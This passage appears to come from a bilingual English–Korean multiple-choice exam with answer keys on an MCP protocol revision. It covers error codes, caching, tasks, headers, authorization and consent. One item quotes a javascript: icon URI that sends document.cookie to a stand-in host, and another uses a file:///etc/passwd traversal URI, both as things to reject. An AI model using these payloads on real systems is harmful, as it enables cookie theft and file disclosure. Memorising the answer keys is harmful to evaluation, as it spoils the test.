어떤 MCP server가 사내 문서를 file:// resource URI로 노출한다. 보안 검토자는 file:///etc/passwd 같은 조작된 URI가 의도한 문서 트리 밖으로 벗어날까 걱정한다. 규격을 따르는 server는 이에 대해 무엇을 해야 하는가?

A. 디렉터리 순회를 막도록 파일 경로를 정제한다. 명세가 server에 요구하는 검사다\
B. 아무것도 하지 않는다. file:// scheme은 이미 신뢰된 로컬 client만 접근할 수 있기 때문이다\
C. file://을 완전히 거부한다. 2026-07-28은 https://와 git:// resource URI만 허용하기 때문이다\
D. 허용한다. resources/read가 이미 모든 호출자를 자기 홈 디렉터리로 제한하기 때문이다

<details><summary>정답</summary>

A. The resources specification requires servers to validate every resource URI and to sanitize file paths to prevent directory traversal attacks. A file:// URI need not map to a physical filesystem at all, but when it does, the server owns the check before any path touches disk, rather than trusting the caller or the transport.

A. resources 명세는 server가 모든 resource URI를 검증하고 디렉터리 순회 공격을 막도록 파일 경로를 정제하라고 요구한다. file:// URI가 꼭 물리 파일 시스템에 대응할 필요는 없다. 하지만 대응한다면 경로가 디스크에 닿기 전에 검사할 책임은 server에 있으며 호출자나 transport를 믿어서는 안 된다.

</details>

## 21. [interactions-and-execution]

A client calls prompts/get for a real prompt name but omits an argument the prompt declares as required. What should the server return?

A. A successful PromptMessage list with the missing argument left as an empty string\
B. A JSON-RPC error with code -32602 for the missing required argument\
C. A tool execution error with isError true, since prompts share the tools error channel\
D. A JSON-RPC error with code -32601, since the prompt itself could not be found

**한국어**

client가 실제로 있는 prompt 이름으로 prompts/get을 호출하면서 그 prompt가 필수로 선언한 인자를 빠뜨린다. server는 무엇을 반환해야 하는가?

A. 빠진 인자를 빈 문자열로 둔 성공 PromptMessage 목록\
B. 빠진 필수 인자에 대한 code -32602 JSON-RPC 오류\
C. prompt가 tool 오류 채널을 공유하므로 isError true인 tool 실행 오류\
D. prompt 자체를 찾을 수 없으므로 code -32601 JSON-RPC 오류

<details><summary>정답</summary>

B. Both an invalid prompt name and a missing required argument are protocol errors coded -32602 under the current allocation, distinct from the tool execution error channel that applies to tools, and distinct from -32601 which means the method itself is unrecognized.

B. 현재 코드 배정에서 잘못된 prompt 이름과 빠진 필수 인자는 둘 다 -32602 프로토콜 오류다. 이것은 tool에 적용되는 tool 실행 오류 채널과 다르고 메서드 자체를 인식하지 못했다는 뜻의 -32601과도 다르다.

</details>

## 22. [interactions-and-execution]

A deploy tool needs the user to confirm a risky action before it proceeds. Under the 2026-07-28 message patterns, how does the server ask for that confirmation?

A. It opens a brand-new subscriptions/listen stream and waits there for the user's eventual final answer\
B. It simply pauses the response indefinitely until the user answers somehow out of band\
C. It returns a result with resultType input_required, carrying inputRequests or requestState to answer\
D. It sends a brand-new server-initiated request straight to the client mid-call

**한국어**

배포 tool이 진행하기 전에 사용자에게 위험한 동작을 확인받아야 한다. 2026-07-28 메시지 패턴에서 server는 그 확인을 어떻게 요청하는가?

A. 완전히 새로운 subscriptions/listen 스트림을 열고 거기서 사용자의 최종 답을 기다린다\
B. 사용자가 어떻게든 대역 외로 답할 때까지 응답을 무기한 멈춘다\
C. resultType이 input_required인 결과를 반환하며 답할 inputRequests나 requestState를 담는다\
D. 호출 도중 client에게 완전히 새로운 server 시작 요청을 바로 보낸다

<details><summary>정답</summary>

C. Multi round-trip requests replaced server-initiated requests entirely, so a server that needs input answers the original call with an input_required result carrying at least one of inputRequests or requestState, which the client answers by retrying the same logical request with a new id.

C. 다중 왕복 요청이 server 시작 요청을 완전히 대체했다. 그래서 입력이 필요한 server는 원래 호출에 input_required 결과로 답하고 그 결과에는 inputRequests와 requestState 중 적어도 하나가 들어간다. client는 같은 논리적 요청을 새 id로 재시도하는 방식으로 답한다.

</details>

## 23. [interactions-and-execution]

A server currently asks the client to run a completion through the client's own model using sampling create message. A migration review flags this as deprecated. What is the recommended replacement?

A. Keep using it forever, since deprecated features never actually change\
B. Replace it with roots/list, since roots and sampling share the same migration path\
C. Replace it with subscriptions/listen so the client streams the completion as resource updates\
D. Switch the server to call an LLM provider's API directly rather than through the client

**한국어**

어떤 server가 지금 sampling create message로 client에게 client 자신의 모델로 completion을 실행하라고 요청한다. 마이그레이션 검토에서 이것이 deprecated라고 지적한다. 권장되는 대체 방법은 무엇인가?

A. 영원히 계속 쓴다. deprecated 기능은 실제로 바뀌는 일이 없기 때문이다\
B. roots/list로 바꾼다. roots와 sampling은 같은 마이그레이션 경로를 공유하기 때문이다\
C. subscriptions/listen으로 바꿔 client가 completion을 resource 업데이트로 스트리밍하게 한다\
D. client를 거치지 않고 server가 LLM 제공자의 API를 직접 호출하도록 바꾼다

<details><summary>정답</summary>

D. Sampling is deprecated in 2026-07-28, and its documented migration is for the server to call a large language model provider's API directly rather than asking the client to run a completion on its behalf. It remains functional but is not the forward path.

D. sampling은 2026-07-28에서 deprecated됐다. 문서화된 마이그레이션은 client에게 대신 completion을 실행해 달라고 요청하는 대신 server가 대형 언어 모델 제공자의 API를 직접 호출하는 것이다. sampling은 여전히 동작하지만 앞으로 나아갈 경로는 아니다.

</details>

## 24. [interactions-and-execution]

An MCP client's stdio connection to a server crashes partway through a conversation, and the client automatically restarts the server subprocess. Before the crash, the client had an active subscriptions/listen stream watching for tool list changes. What must the client do after the restart to keep receiving those notifications?

A. Re-send a new subscriptions/listen request, since the previous stream did not survive the crash and restart\
B. Nothing, since the server automatically remembers and resumes the previous listen stream on its own\
C. Send notifications/cancelled first, since that is what reopens a listen stream after a crash\
D. Wait for the server to proactively re-establish the stream using the old subscriptionId value

**한국어**

대화 도중 MCP client와 server의 stdio 연결이 크래시하고 client가 server 하위 프로세스를 자동으로 다시 시작한다. 크래시 전에 client는 tool 목록 변경을 지켜보는 활성 subscriptions/listen 스트림을 가지고 있었다. 재시작 뒤 그 notification을 계속 받으려면 client는 무엇을 해야 하는가?

A. 새 subscriptions/listen 요청을 다시 보낸다. 이전 스트림은 크래시와 재시작을 넘어 살아남지 못했기 때문이다\
B. 아무것도 하지 않는다. server가 이전 listen 스트림을 스스로 기억하고 자동으로 재개하기 때문이다\
C. notifications/cancelled를 먼저 보낸다. 크래시 뒤 listen 스트림을 다시 여는 것이 그것이기 때문이다\
D. server가 예전 subscriptionId 값으로 스트림을 먼저 다시 맺어 주기를 기다린다

<details><summary>정답</summary>

A. A stdio subprocess restart discards whatever the previous process was tracking, including an open listen stream, so the client is responsible for re-issuing subscriptions/listen after it restarts the server, the same way it retries other lost requests rather than waiting on the server to reconnect on its own.

A. stdio 하위 프로세스를 재시작하면 이전 프로세스가 추적하던 것은 열린 listen 스트림까지 모두 사라진다. 그래서 server를 재시작한 뒤 subscriptions/listen을 다시 보내는 것은 client의 책임이다. 잃어버린 다른 요청을 server가 알아서 다시 연결해 주길 기다리지 않고 재시도하는 것과 같다.

</details>

## 25. [interactions-and-execution]

An operator debugging a failed tool call sees a JSON-RPC error with code -32602 rather than a result with isError true. Which situation matches that response shape?

A. The arguments were well formed but failed a business rule enforced by the tool's own logic\
B. The request named a tool that does not exist on this server\
C. An external API the tool depends on returned a failure\
D. The arguments failed validation against the tool's declared inputSchema

**한국어**

실패한 tool 호출을 디버깅하던 운영자가 isError true인 결과가 아니라 code -32602 JSON-RPC 오류를 본다. 그 응답 형태에 맞는 상황은 무엇인가?

A. 인자 형식은 올바랐지만 tool 자체 로직이 강제하는 비즈니스 규칙을 통과하지 못했다\
B. 요청이 이 server에 존재하지 않는 tool을 지목했다\
C. tool이 의존하는 외부 API가 실패를 반환했다\
D. 인자가 tool이 선언한 inputSchema 검증을 통과하지 못했다

<details><summary>정답</summary>

B. An unknown tool name is a protocol-level failure returned as a JSON-RPC error coded -32602, while schema-invalid arguments, business rule rejections, and downstream API failures are all represented as tool execution errors, a normal result with isError true, so the model can see and react to them.

B. 알 수 없는 tool 이름은 프로토콜 수준 실패이며 code -32602 JSON-RPC 오류로 반환된다. 반면 스키마에 맞지 않는 인자, 비즈니스 규칙 거부, 하위 API 실패는 모두 tool 실행 오류, 곧 isError true인 일반 결과로 표현된다. 그래야 모델이 그것을 보고 대응할 수 있다.

</details>

## 26. [interactions-and-execution]

A code reviewer sees a pull request that returns a JSON-RPC -32602 error whenever a tool's arguments fail a business rule, such as a discount percentage over the allowed maximum. What should the reviewer flag?

A. That the code should use -32002, since that is the correct code for invalid business input\
B. That the code should use -32601 instead, since the tool method itself is unknown\
C. That business rule failures should instead be a tool execution error with isError true\
D. Nothing, since business rule violations are exactly what -32602 exists for

**한국어**

코드 리뷰어가 할인율이 허용 최댓값을 넘는 경우처럼 tool 인자가 비즈니스 규칙을 통과하지 못할 때마다 JSON-RPC -32602 오류를 반환하는 pull request를 본다. 리뷰어는 무엇을 지적해야 하는가?

A. 잘못된 비즈니스 입력에 맞는 코드는 -32002이므로 그것을 써야 한다\
B. tool 메서드 자체를 알 수 없으므로 대신 -32601을 써야 한다\
C. 비즈니스 규칙 실패는 대신 isError true인 tool 실행 오류여야 한다\
D. 아무것도 없다. 비즈니스 규칙 위반이야말로 -32602가 존재하는 이유이기 때문이다

<details><summary>정답</summary>

C. Input validation and business logic failures are tool execution errors returned as a normal result with isError true, not JSON-RPC protocol errors, because that channel lets the failure content flow back into the model's context so it can adjust its arguments.

C. 입력 검증 실패와 비즈니스 로직 실패는 JSON-RPC 프로토콜 오류가 아니라 isError true인 일반 결과로 반환되는 tool 실행 오류다. 그 채널을 써야 실패 내용이 모델의 컨텍스트로 돌아가고 모델이 인자를 고칠 수 있기 때문이다.

</details>

## 27. [interactions-and-execution]

A gateway in front of several MCP servers receives a POST whose MCP-Protocol-Version header does not match the protocolVersion value inside the request's metadata. What should the gateway do?

A. Ignore the header and trust only the value inside the request body\
B. Silently rewrite the header to match the body before forwarding it\
C. Forward the request as is, since headers are advisory hints only\
D. Reject the request with HTTP 400 and the HeaderMismatch error code

**한국어**

여러 MCP server 앞에 있는 게이트웨이가 MCP-Protocol-Version 헤더가 요청 메타데이터 안의 protocolVersion 값과 일치하지 않는 POST를 받는다. 게이트웨이는 무엇을 해야 하는가?

A. 헤더를 무시하고 요청 본문 안의 값만 믿는다\
B. 전달하기 전에 헤더를 본문에 맞게 조용히 다시 쓴다\
C. 헤더는 참고용 힌트일 뿐이므로 요청을 그대로 전달한다\
D. HTTP 400과 HeaderMismatch 오류 코드로 요청을 거부한다

<details><summary>정답</summary>

D. Streamable HTTP requires the MCP-Protocol-Version header to equal the version carried in the request metadata, and a disagreement between the header and the body is exactly the condition the HeaderMismatch error exists to report, returned as HTTP 400 with JSON-RPC code -32020.

D. Streamable HTTP는 MCP-Protocol-Version 헤더가 요청 메타데이터에 담긴 버전과 같기를 요구한다. 헤더와 본문이 어긋나는 것은 바로 HeaderMismatch 오류가 알리려고 만든 상황이며 HTTP 400과 JSON-RPC code -32020으로 반환된다.

</details>

## 28. [interactions-and-execution] (복수 정답)

A host developer is deciding what to cache from a slow-changing MCP server to cut latency for the agent's next turn. Which two practices match the 2026-07-28 caching model? Select two.

A. Invalidate a cached list immediately on receiving the matching list_changed notification rather than waiting out the ttlMs\
B. Cache an input_required result the same way as any other complete result, since it saves a round trip\
C. Treat cacheScope public as proof that the data is safe to show to any user, regardless of what the request required\
D. Partition private cacheScope entries by authorization context so cached results never cross between users

**한국어**

host 개발자가 에이전트의 다음 턴 지연을 줄이려고 잘 바뀌지 않는 MCP server에서 무엇을 캐시할지 정하고 있다. 2026-07-28 캐싱 모델에 맞는 방식 두 개는 무엇인가? 두 개 고르시오.

A. 해당 list_changed notification을 받으면 ttlMs가 다 지나기를 기다리지 말고 캐시된 목록을 즉시 무효화한다\
B. input_required 결과도 왕복을 줄여 주므로 다른 완결된 결과와 똑같이 캐시한다\
C. cacheScope public을 요청이 무엇을 요구했든 그 데이터를 어떤 사용자에게 보여 줘도 안전하다는 증거로 취급한다\
D. private cacheScope 항목을 인가 컨텍스트별로 나눠서 캐시된 결과가 사용자 사이를 절대 넘나들지 않게 한다

<details><summary>정답</summary>

A, D. Private cache entries must never cross authorization contexts, and a list_changed notification invalidates a cached list immediately regardless of its remaining ttlMs, since ttlMs is only a freshness hint. cacheScope is never an access control, and MRTR input_required results are never cached.

A, D. private 캐시 항목은 인가 컨텍스트를 절대 넘나들어서는 안 된다. 또 ttlMs는 신선도 힌트일 뿐이므로 list_changed notification을 받으면 남은 ttlMs와 상관없이 캐시된 목록을 즉시 무효화한다. cacheScope는 결코 접근 제어가 아니며 MRTR input_required 결과는 절대 캐시하지 않는다.

</details>

## 29. [interactions-and-execution]

A team is building a report-generation tool that can take anywhere from a few seconds to twenty minutes depending on the report size, and the client may disconnect and reconnect during that time. Which approach fits best?

A. Return the report through the tasks extension, so the client can poll and reconnect using a taskId\
B. Use a server-minted handle and have the client poll resources/read on a fixed schedule\
C. Use MRTR and treat the entire twenty-minute wait as one input_required round trip\
D. Always answer with a plain complete result and let the HTTP connection stay open for twenty minutes

**한국어**

한 팀이 보고서 크기에 따라 몇 초에서 20분까지 걸릴 수 있는 보고서 생성 tool을 만들고 있다. 그동안 client가 연결을 끊었다가 다시 연결할 수도 있다. 가장 알맞은 방식은 무엇인가?

A. tasks extension으로 보고서를 반환해서 client가 taskId로 폴링하고 다시 연결할 수 있게 한다\
B. server가 발급한 handle을 쓰고 client가 정해진 일정으로 resources/read를 폴링하게 한다\
C. MRTR을 쓰고 20분 대기 전체를 input_required 왕복 하나로 취급한다\
D. 항상 평범한 완결 결과로 답하고 HTTP 연결을 20분 동안 열어 둔다

<details><summary>정답</summary>

A. Long, unpredictable work that must survive disconnection is exactly what the tasks extension is for: the server answers with a task result carrying a taskId, and the client polls tasks/get and can resume tracking it after a reconnect, unlike a single held-open response or an MRTR round trip meant for one input exchange.

A. 연결이 끊겨도 살아남아야 하는 길고 예측하기 어려운 작업이 바로 tasks extension의 용도다. server는 taskId를 담은 task 결과로 답하고 client는 tasks/get을 폴링하며 재연결 뒤에도 추적을 이어 갈 수 있다. 계속 열어 둔 단일 응답이나, 입력 교환 한 번을 위한 MRTR 왕복과는 다르다.

</details>

## 30. [interactions-and-execution]

An operator sees a tool call that was cancelled by the client, but a late result for that same call arrives from the server moments later. What is the correct handling?

A. Retry the same request id to force the server to resend the cancellation acknowledgment\
B. Discard the late result, since races after cancellation are expected and should be ignored\
C. Reject the entire connection, since a late result after cancellation means the server is broken\
D. Treat the late result as authoritative and apply it as if cancellation never happened

**한국어**

운영자가 client가 취소한 tool 호출을 보고 있는데, 잠시 뒤 server에서 같은 호출에 대한 늦은 결과가 도착한다. 올바른 처리는 무엇인가?

A. 같은 요청 id로 재시도해서 server가 취소 확인 응답을 다시 보내게 한다\
B. 늦은 결과를 버린다. 취소 뒤의 경합은 예상되는 일이고 무시해야 하기 때문이다\
C. 취소 뒤 늦은 결과가 온 것은 server가 고장 났다는 뜻이므로 연결 전체를 거부한다\
D. 늦은 결과를 권위 있는 것으로 보고 취소가 없었던 것처럼 적용한다

<details><summary>정답</summary>

B. Cancellation is inherently racy: a response can be in flight when the cancellation is sent, so a late response to an already-cancelled request is expected and should simply be ignored rather than applied, escalated as a defect, or retried under the same id.

B. 취소는 본래 경합이 생긴다. 취소를 보낼 때 응답이 이미 전송 중일 수 있다. 그래서 이미 취소된 요청에 대한 늦은 응답은 예상되는 일이며 적용하거나 결함으로 올리거나 같은 id로 재시도하지 말고 그냥 무시해야 한다.

</details>

## 31. [interactions-and-execution]

A server returns an InputRequiredResult whose inputRequests map uses the keys confirm_deploy and pick_region, with no requestState. How must the client shape its retry of the original tools/call?

A. Send inputResponses under keys of the client's choosing, plus an empty requestState string\
B. Send only the answer to the first key, since a server asks one question per round trip\
C. Send inputResponses under the same two keys the server chose, and omit requestState\
D. Send the answers in a new elicitation/create request instead of retrying the original call

**한국어**

server가 InputRequiredResult를 반환했는데, 그 inputRequests 맵은 confirm_deploy와 pick_region 키를 쓰고 requestState는 없다. client는 원래 tools/call을 재시도할 때 어떤 형태로 보내야 하는가?

A. client가 고른 키로 inputResponses를 보내고 빈 requestState 문자열을 더한다\
B. server는 왕복 한 번에 질문 하나만 하므로 첫 번째 키에 대한 답만 보낸다\
C. server가 고른 같은 두 키로 inputResponses를 보내고 requestState는 생략한다\
D. 원래 호출을 재시도하지 않고 새 elicitation/create 요청에 답을 담아 보낸다

<details><summary>정답</summary>

C. The retry repeats the original request with a new id and adds inputResponses under exactly the keys the server chose in inputRequests, so the server can match each answer to its question. requestState is echoed only when the server supplied one; a client must not invent it or send an empty value.

C. 재시도는 원래 요청을 새 id로 반복하고 server가 inputRequests에서 고른 키와 정확히 같은 키로 inputResponses를 더한다. 그래야 server가 각 답을 질문에 짝지을 수 있다. requestState는 server가 제공했을 때만 그대로 돌려보낸다. client가 지어내거나 빈 값을 보내서는 안 된다.

</details>

## 32. [interactions-and-execution]

A team is migrating a legacy server that still expects an initialize handshake to the 2026-07-28 wire format. During the transition, a dual-era client sends a modern request directly over stdio and the server responds with something other than a DiscoverResult or a recognized modern error. What should the client conclude?

A. The server is modern but temporarily overloaded, so the client should keep retrying the same request\
B. The server must have crashed, so the client should restart the subprocess immediately\
C. The server rejected the specific protocol version, so the client should retry using the supported list\
D. The server is legacy, so the client should fall back to the initialize handshake

**한국어**

한 팀이 여전히 initialize 핸드셰이크를 기대하는 레거시 server를 2026-07-28 통신 형식으로 마이그레이션하고 있다. 전환 기간에 두 시대를 모두 지원하는 client가 stdio로 최신 요청을 바로 보냈더니, server가 DiscoverResult도 아니고 인식 가능한 최신 오류도 아닌 무언가로 응답한다. client는 무엇이라고 결론 내려야 하는가?

A. server는 최신이지만 일시적으로 과부하 상태이므로 client는 같은 요청을 계속 재시도해야 한다\
B. server가 크래시했음이 틀림없으므로 client는 즉시 하위 프로세스를 다시 시작해야 한다\
C. server가 해당 프로토콜 버전을 거부했으므로 client는 지원 목록을 써서 재시도해야 한다\
D. server는 레거시이므로 client는 initialize 핸드셰이크로 되돌아가야 한다

<details><summary>정답</summary>

D. On stdio, an unrecognized error or a timeout in response to a modern probe means the server is legacy and the client should fall back to the initialize handshake, while a recognized modern error such as UnsupportedProtocolVersion would instead mean modern with a different version, never a blind fallback keyed on one code.

D. stdio에서 최신 탐색 요청에 인식할 수 없는 오류나 타임아웃이 돌아오면 server가 레거시라는 뜻이고 client는 initialize 핸드셰이크로 되돌아가야 한다. 반면 UnsupportedProtocolVersion 같은 인식 가능한 최신 오류는 최신 server이지만 버전이 다르다는 뜻이다. 오류 코드 하나만 보고 무작정 되돌아가서는 안 된다.

</details>

## 33. [interactions-and-execution] (복수 정답)

A gateway operator is configuring which HTTP headers must be present on every request POSTed to a 2026-07-28 MCP endpoint. Which two headers are required by the specification? Select two.

A. Mcp-Session-Id, to keep requests bound to the same session\
B. MCP-Protocol-Version, matching the version carried in the request's metadata\
C. Mcp-Method, naming the JSON-RPC method the request carries\
D. Last-Event-ID, to support resuming a dropped stream

**한국어**

게이트웨이 운영자가 2026-07-28 MCP 엔드포인트로 POST되는 모든 요청에 어떤 HTTP 헤더가 반드시 있어야 하는지 설정하고 있다. 명세가 요구하는 헤더 두 개는 무엇인가? 두 개 고르시오.

A. Mcp-Session-Id. 요청을 같은 세션에 묶어 두기 위해서다\
B. MCP-Protocol-Version. 요청 메타데이터에 담긴 버전과 일치해야 한다\
C. Mcp-Method. 요청이 담고 있는 JSON-RPC 메서드 이름을 적는다\
D. Last-Event-ID. 끊긴 스트림의 재개를 지원하기 위해서다

<details><summary>정답</summary>

B, C. Streamable HTTP requires MCP-Protocol-Version on every request, matching the version in the request's metadata, and Mcp-Method naming the request's method so intermediaries can route without parsing the body. Mcp-Session-Id and Last-Event-ID belonged to the removed session and stream-resumability mechanisms and no longer apply.

B, C. Streamable HTTP는 모든 요청에 요청 메타데이터의 버전과 일치하는 MCP-Protocol-Version을 요구한다. 또 중간 장비가 본문을 파싱하지 않고 라우팅할 수 있도록 요청 메서드 이름을 적은 Mcp-Method도 요구한다. Mcp-Session-Id와 Last-Event-ID는 제거된 세션과 스트림 재개 메커니즘에 속했으며 더 이상 적용되지 않는다.

</details>

## 34. [interactions-and-execution] (복수 정답)

A team reviewing the tasks extension wants to confirm which statuses a task can report while the client polls tasks/get. Which two are real statuses in the 2026-07-28 design? Select two.

A. cancelled, used when a cooperative tasks/cancel request succeeded\
B. input_required, used when the task needs an answer before it can continue\
C. queued_for_review, used whenever a human must approve the task before it starts\
D. retrying, used automatically whenever the underlying tool call throws an exception

**한국어**

tasks extension을 검토하는 팀이 client가 tasks/get을 폴링하는 동안 task가 보고할 수 있는 상태가 무엇인지 확인하려 한다. 2026-07-28 설계에 실제로 있는 상태 두 개는 무엇인가? 두 개 고르시오.

A. cancelled. 협조적인 tasks/cancel 요청이 성공했을 때 쓴다\
B. input_required. task가 계속하려면 답이 필요할 때 쓴다\
C. queued_for_review. task가 시작되기 전에 사람이 승인해야 할 때마다 쓴다\
D. retrying. 하위 tool 호출이 예외를 던질 때마다 자동으로 쓴다

<details><summary>정답</summary>

A, B. The tasks extension defines the statuses working, input_required, completed, failed, and cancelled, so a task can pause for mid-flight input or end because a cooperative cancel request succeeded. There is no separate queued_for_review or automatic retrying status in the redesigned extension.

A, B. tasks extension은 working, input_required, completed, failed, cancelled 상태를 정의한다. 그래서 task는 실행 도중 입력을 받으려고 멈추거나, 협조적인 취소 요청이 성공해서 끝날 수 있다. 재설계된 extension에는 별도의 queued_for_review 상태나 자동 retrying 상태가 없다.

</details>

## 35. [security-and-governance]

A host offers one-click setup: a user pastes a configuration snippet from a web page, and the host can start the local stdio server it describes. What must the host do before it runs that server's command?

A. Show the exact command untruncated, flag it as code execution, and require explicit approval\
B. Run the command in the model's sandbox, since the model recommended the configuration\
C. Ask the server for its serverInfo first, and run it only if the reported name looks legitimate\
D. Run the command at once, since a local stdio server sits inside the host's own trust zone

**한국어**

host가 원클릭 설정을 제공한다. 사용자가 웹 페이지에서 설정 스니펫을 붙여 넣으면 host는 그 스니펫이 설명하는 로컬 stdio server를 시작할 수 있다. host는 그 server의 명령을 실행하기 전에 무엇을 해야 하는가?

A. 정확한 명령을 잘리지 않게 보여 주고 코드 실행이라고 표시하고 명시적 승인을 요구한다\
B. 모델이 그 설정을 추천했으므로 모델의 샌드박스에서 명령을 실행한다\
C. 먼저 server에 serverInfo를 요청하고 보고된 이름이 정상으로 보일 때만 실행한다\
D. 로컬 stdio server는 host 자신의 신뢰 영역 안에 있으므로 명령을 바로 실행한다

<details><summary>정답</summary>

A. One-click local configuration executes code on the user's machine, so the specification's security guidance requires the client to show the exact command without truncation, identify it as a potentially dangerous operation, require explicit approval, and let the user cancel. Being local does not make a pasted command trustworthy, and self-reported serverInfo proves nothing about it.

A. 원클릭 로컬 설정은 사용자 컴퓨터에서 코드를 실행한다. 그래서 명세의 보안 지침은 client가 정확한 명령을 잘림 없이 보여 주고 잠재적으로 위험한 작업임을 밝히고 명시적 승인을 요구하고 사용자가 취소할 수 있게 하라고 요구한다. 로컬이라고 해서 붙여 넣은 명령을 믿을 수 있는 것은 아니며 스스로 보고한 serverInfo는 그 명령에 대해 아무것도 증명하지 못한다.

</details>

## 36. [security-and-governance]

A client calls an MCP server over HTTP without a token and receives a 401 response. How is the client expected to discover which authorization server issues tokens for this resource?

A. By asking the end user to paste in the authorization server's URL from memory\
B. By reading the WWW-Authenticate header's resource_metadata value or the well-known metadata paths\
C. By reading the server's self-reported serverInfo field returned from the server/discover call instead\
D. By simply guessing common authorization server domains until one finally accepts the client

**한국어**

client가 토큰 없이 HTTP로 MCP server를 호출했다가 401 응답을 받는다. client는 이 resource에 토큰을 발급하는 인가 서버를 어떻게 찾아야 하는가?

A. 최종 사용자에게 인가 서버 URL을 기억해서 붙여 넣으라고 요청한다\
B. WWW-Authenticate 헤더의 resource_metadata 값이나 well-known 메타데이터 경로를 읽는다\
C. 대신 server/discover 호출에서 반환된, server가 스스로 보고한 serverInfo 필드를 읽는다\
D. 흔한 인가 서버 도메인을 하나가 결국 client를 받아 줄 때까지 그냥 짐작해 본다

<details><summary>정답</summary>

B. A 401 response should carry a WWW-Authenticate challenge with a resource_metadata value, or the client falls back to the well-known Protected Resource Metadata paths, both of which point at Protected Resource Metadata naming the authorization servers, rather than relying on guesses or self-reported serverInfo.

B. 401 응답에는 resource_metadata 값을 담은 WWW-Authenticate 챌린지가 있어야 한다. 없으면 client는 well-known Protected Resource Metadata 경로로 대신 찾는다. 둘 다 인가 서버를 명시한 Protected Resource Metadata를 가리킨다. 짐작이나 스스로 보고한 serverInfo에 의존하지 않는다.

</details>

## 37. [security-and-governance]

A command-line MCP client meets an authorization server that does not advertise Client ID Metadata Document support, so it falls back to Dynamic Client Registration with a localhost redirect URI. Which application_type must its registration request carry?

A. service, since command-line tools register as unattended machine-to-machine clients\
B. web, since every OAuth client that completes a browser redirect counts as a web application\
C. native, since desktop, command-line, and localhost clients register as native applications\
D. none, since application_type is optional metadata that authorization servers ignore

**한국어**

명령줄 MCP client가 Client ID Metadata Document 지원을 알리지 않는 인가 서버를 만나서, localhost redirect URI로 Dynamic Client Registration에 대신 의존한다. 그 등록 요청에는 어떤 application_type을 담아야 하는가?

A. service. 명령줄 도구는 무인 machine-to-machine client로 등록되기 때문이다\
B. web. 브라우저 redirect를 거치는 모든 OAuth client는 웹 애플리케이션으로 치기 때문이다\
C. native. 데스크톱, 명령줄, localhost client는 네이티브 애플리케이션으로 등록되기 때문이다\
D. none. application_type은 인가 서버가 무시하는 선택적 메타데이터이기 때문이다

<details><summary>정답</summary>

C. A client that falls back to Dynamic Client Registration must send application_type: native for desktop, command-line, and localhost clients, and web for remote browser-based clients, so the authorization server applies the right redirect URI rules. Dynamic Client Registration is itself deprecated in favor of Client ID Metadata Documents but remains the fallback when those are not advertised.

C. Dynamic Client Registration으로 대신하는 client는 데스크톱, 명령줄, localhost client라면 application_type: native를, 원격 브라우저 기반 client라면 web을 보내야 한다. 그래야 인가 서버가 알맞은 redirect URI 규칙을 적용한다. Dynamic Client Registration 자체는 Client ID Metadata Document 쪽으로 넘어가며 deprecated됐지만 그것이 지원된다고 알려지지 않았을 때는 여전히 대안으로 남는다.

</details>

## 38. [security-and-governance]

A user approves a destructive delete_record tool call after reviewing its arguments. Moments later in the same turn, the model wants to call a different destructive tool, archive_record. Does the earlier approval cover this new call?

A. Yes, since one destructive-tool approval covers every destructive tool for the rest of the turn\
B. Yes, but only because both tool names share a common record-related prefix\
C. No, but only because archive_record happens to have a longer name than delete_record\
D. No, each sensitive tool call needs its own consent, so approving one destructive tool does not approve another

**한국어**

사용자가 인자를 검토한 뒤 destructive tool인 delete_record 호출을 승인한다. 잠시 뒤 같은 턴에서 모델이 다른 destructive tool인 archive_record를 호출하려 한다. 앞의 승인이 이 새 호출에도 적용되는가?

A. 그렇다. destructive tool 승인 한 번이 그 턴의 남은 모든 destructive tool에 적용되기 때문이다\
B. 그렇다. 다만 두 tool 이름이 record 관련 공통 접두사를 공유하기 때문일 뿐이다\
C. 아니다. 다만 archive_record의 이름이 delete_record보다 길기 때문일 뿐이다\
D. 아니다. 민감한 tool 호출은 각각 별도 동의가 필요하므로 destructive tool 하나를 승인해도 다른 tool이 승인되지 않는다

<details><summary>정답</summary>

D. Consent is scoped per invocation rather than granted blanket for a session, so approving one destructive call does not extend to a different tool even later in the same turn. Shared naming or relative name length have no bearing on whether consent transfers between tools.

D. 동의는 세션 전체에 포괄적으로 주어지는 것이 아니라 호출 단위로 적용된다. 그래서 destructive 호출 하나를 승인해도 같은 턴 안이라 해도 다른 tool에까지 넓어지지 않는다. 이름이 비슷하거나 길이가 다르다는 점은 동의가 tool 사이에 옮겨 가는지와 아무 관계가 없다.

</details>

## 39. [security-and-governance]

A security owner reviewing a new server finds a tool whose icons entry has src set to javascript:fetch('https://collect.example/'+document.cookie). What must a client that renders icons do with this icon?

A. Reject it, since icon URIs must be HTTPS or data: and unsafe schemes such as javascript: are refused\
B. Render it, since icons are cosmetic metadata that never execute inside a host's interface\
C. Render it only after the model confirms the icon matches the tool's stated purpose\
D. Rewrite the javascript: scheme to https: automatically and then fetch the new address

**한국어**

새 server를 검토하던 보안 책임자가 icons 항목의 src가 javascript:fetch('https://collect.example/'+document.cookie)로 설정된 tool을 발견한다. 아이콘을 렌더링하는 client는 이 아이콘을 어떻게 처리해야 하는가?

A. 거부한다. 아이콘 URI는 HTTPS나 data:여야 하며 javascript: 같은 안전하지 않은 scheme은 거부되기 때문이다\
B. 렌더링한다. 아이콘은 host 인터페이스 안에서 절대 실행되지 않는 장식용 메타데이터이기 때문이다\
C. 아이콘이 tool의 명시된 목적과 맞는다고 모델이 확인한 뒤에만 렌더링한다\
D. javascript: scheme을 https:로 자동으로 바꾼 뒤 새 주소를 가져온다

<details><summary>정답</summary>

A. Icon metadata is untrusted server input. The specification requires consumers to accept only HTTPS or data: icon URIs, to reject unsafe schemes and redirects such as javascript:, and to treat fetched payloads such as SVG as potentially executable. Rewriting the scheme or asking the model does not make an attacker-controlled URI safe.

A. 아이콘 메타데이터는 신뢰할 수 없는 server 입력이다. 명세는 소비자가 HTTPS나 data: 아이콘 URI만 받아들이고 javascript: 같은 안전하지 않은 scheme과 리다이렉트를 거부하고 SVG처럼 가져온 페이로드를 실행될 수 있는 것으로 다루라고 요구한다. scheme을 바꾸거나 모델에 묻는다고 공격자가 통제하는 URI가 안전해지지 않는다.

</details>

## 40. [security-and-governance]

An incident review needs to trace one failed tool call across the host, the client, and the server that executed it. What mechanism is designed to carry that correlation across the hops?

A. The JSON-RPC id, since request ids are guaranteed unique across the entire system forever\
B. OpenTelemetry trace context carried in request metadata as traceparent, tracestate, and baggage\
C. The clientInfo field, since it is always self-reported by the client on every single outgoing request\
D. The cacheScope field, since it supposedly labels which requests belong to the same trace

**한국어**

